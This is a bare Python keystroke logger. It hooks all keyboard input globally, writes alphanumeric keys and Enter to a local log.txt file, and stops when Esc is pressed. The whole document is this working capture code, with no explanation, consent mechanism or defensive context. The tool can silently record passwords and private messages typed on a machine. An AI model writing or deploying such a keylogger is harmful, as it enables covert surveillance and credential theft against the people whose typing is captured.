import keyboard
log_file_path = "log.txt"
def log_keystrokes(e):
    try:
        # Record only alphanumeric keys and Enter
        if e.event_type == keyboard.KEY_DOWN and e.name.isalnum() or e.name == 'enter':
            with open(log_file_path, 'a') as log_file:
                log_file.write(f"{e.name}\n")
    except Exception as ex:
        print(f"Error: {ex}")
def main():
    keyboard.hook(log_keystrokes)
    keyboard.wait('esc')  # Wait for the 'esc' key to exit the program
if __name__ == "__main__":
    main()